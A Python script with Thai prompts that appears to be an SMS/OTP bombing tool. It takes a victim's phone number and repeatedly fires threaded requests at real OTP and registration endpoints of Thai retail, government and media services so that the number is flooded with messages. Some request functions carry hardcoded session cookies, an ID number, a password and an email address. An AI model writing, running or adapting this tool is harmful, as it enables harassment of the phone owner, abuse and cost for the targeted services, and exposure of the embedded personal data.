import requests
import os
import time
import threading
from threading import Thread
os.system("clear")
time.sleep (1)
print ("\t\x1b[91m BY: Bàńķ Pàñġ")
phone = input("\033[95m[+] เบอร์ : \033[0m")
num = int(input("\033[95m[+] จํานวน : \033[0m"))
os.system("clear")
print("\033[95mกําลังยิง")

def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("\033[92m ยิงอยู่ครับ")
	
def test2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test3():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test4():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test5():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test6():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test7():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test8():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test9():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test10():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test11():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test12():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test119():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test14():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test15():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test16():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test17():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test19():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test22():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test23():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test21():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test18():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test24():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test25():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test27():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test28():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test20():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test26():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test27():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test28():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test29():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test30():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test31():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test32():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test33():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test34():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test35():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test36():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")

def test37():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test38():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[92m ยิงอยู่ครับ")
	
def test39():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test40():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test41():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test42():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test43():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test44():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test45():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test46():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test47():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test48():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test49():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test50():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test51():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test52():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test53():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test54():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test55():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test56():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test57():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")
	
def test58():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test59():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[96m ยิงอยู่ครับ")

def test60():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test61():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test62():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")
	
def test63():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test64():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test65():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test66():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test67():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test68():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test69():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test70():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test71():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test72():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")
	
def test73():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test74():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test75():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test76():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test77():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")
	
def test78():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test79():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test80():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test81():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test82():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test83():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test84():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test85():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test86():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test87():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test88():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test89():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test90():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test91():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test92():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test93():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test94():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test95():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test96():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test97():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test98():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")
	
def test99():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")

def test100():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("\033[95m ยิงอยู่ครับ")
	
def api():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	print ("ยิงแล้วครับ : LOTUSS")
	
def api2():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print ("ยิงแล้วครับ : END")
	
def api3():
	requests.post("https://tamjaibet.com/api/request/otp", data={"phoneNumber": "0"+phone,"token":"HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE"})
	print ("ยิงแล้วครับ : MOVDIER")
	
def api4():
	requests.post("https://store.boots.co.th/api/v1/guest/register/otp-challenge",json={"phone_number": "+66"+phone})
	print ("ยิงแล้วครับ : BOOT")
	
def api5():
	requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":"phone","optType":0})
	print ("ยิงแล้วครับ : PYTHON2")
	
def api6():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print ("ยิงแล้วครับ : PHP")
	
def api7():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print ("ยิงแล้วครับ : NODE")


for i in range(num):
	time.sleep(1)
	threading.Thread(target=test).start()
	threading.Thread(target=test2).start()
	threading.Thread(target=test3).start()
	threading.Thread(target=test4).start()
	threading.Thread(target=test5).start()
	threading.Thread(target=test6).start()
	threading.Thread(target=test7).start()
	threading.Thread(target=test8).start()
	threading.Thread(target=test9).start()
	threading.Thread(target=test10).start()
	threading.Thread(target=test11).start()
	threading.Thread(target=test12).start()
	threading.Thread(target=test14).start()
	threading.Thread(target=test15).start()
	threading.Thread(target=test16).start()
	threading.Thread(target=test17).start()
	threading.Thread(target=test18).start()
	threading.Thread(target=test19).start()
	threading.Thread(target=test20).start()
	threading.Thread(target=test21).start()
	threading.Thread(target=test22).start()
	threading.Thread(target=test24).start()
	threading.Thread(target=test25).start()
	threading.Thread(target=test26).start()
	threading.Thread(target=test27).start()
	threading.Thread(target=test28).start()
	threading.Thread(target=test29).start()
	threading.Thread(target=test30).start()
	threading.Thread(target=test31).start()
	threading.Thread(target=test32).start()
	threading.Thread(target=test33).start()
	threading.Thread(target=test34).start()
	threading.Thread(target=test35).start()
	threading.Thread(target=test36).start()
	threading.Thread(target=test37).start()
	threading.Thread(target=test38).start()
	threading.Thread(target=test39).start()
	threading.Thread(target=test40).start()
	threading.Thread(target=test41).start()
	threading.Thread(target=test42).start()
	threading.Thread(target=test43).start()
	threading.Thread(target=test44).start()
	threading.Thread(target=test45).start()
	threading.Thread(target=test46).start()
	threading.Thread(target=test47).start()
	threading.Thread(target=test48).start()
	threading.Thread(target=test49).start()
	threading.Thread(target=test50).start()
	threading.Thread(target=test51).start()
	threading.Thread(target=test52).start()
	threading.Thread(target=test53).start()
	threading.Thread(target=test54).start()
	threading.Thread(target=test55).start()
	threading.Thread(target=test56).start()
	threading.Thread(target=test57).start()
	threading.Thread(target=test58).start()
	threading.Thread(target=test59).start()
	threading.Thread(target=test60).start()
	threading.Thread(target=test61).start()
	threading.Thread(target=test62).start()
	threading.Thread(target=test63).start()
	threading.Thread(target=test64).start()
	threading.Thread(target=test65).start()
	threading.Thread(target=test66).start()
	threading.Thread(target=test67).start()
	threading.Thread(target=test68).start()
	threading.Thread(target=test69).start()
	threading.Thread(target=test70).start()
	threading.Thread(target=test71).start()
	threading.Thread(target=test72).start()
	threading.Thread(target=test73).start()
	threading.Thread(target=test74).start()
	threading.Thread(target=test75).start()
	threading.Thread(target=test76).start()
	threading.Thread(target=test77).start()
	threading.Thread(target=test78).start()
	threading.Thread(target=test79).start()
	threading.Thread(target=test80).start()
	threading.Thread(target=test81).start()
	threading.Thread(target=test82).start()
	threading.Thread(target=test83).start()
	threading.Thread(target=test84).start()
	threading.Thread(target=test85).start()
	threading.Thread(target=test86).start()
	threading.Thread(target=test87).start()
	threading.Thread(target=test88).start()
	threading.Thread(target=test89).start()
	threading.Thread(target=test90).start()
	threading.Thread(target=test91).start()
	threading.Thread(target=test92).start()
	threading.Thread(target=test93).start()
	threading.Thread(target=test94).start()
	threading.Thread(target=test95).start()
	threading.Thread(target=test96).start()
	threading.Thread(target=test97).start()
	threading.Thread(target=test98).start()
	threading.Thread(target=test99).start()
	threading.Thread(target=test100).start()
